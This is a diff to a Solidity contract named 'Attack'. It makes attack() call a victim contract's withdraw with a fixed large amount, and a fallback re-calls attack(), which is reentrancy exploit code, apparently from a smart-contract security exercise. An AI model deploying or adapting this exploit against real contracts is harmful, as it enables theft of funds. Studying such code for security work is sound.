@@ -12,9 +12,9 @@ contract Attack {
         require(snet, "success");
     }
 
-    function attack(uint256 _num) public payable {
+    function attack() public payable {
         (bool res, ) = payable(victimAddress).call(
-            abi.encodeWithSignature("withdraw(uint256)", _num)
+            abi.encodeWithSignature("withdraw(uint256)", 1000000000000)
         );
         require(res, "attack failed");
         // payable(victimAddress).call(bytes4(keccak256("withdraw(uint256)")),1000000000);
@@ -27,4 +27,6 @@ contract Attack {
     fallback() external payable {
         this.attack();
     }
+
+    receive() external payable {}
 }
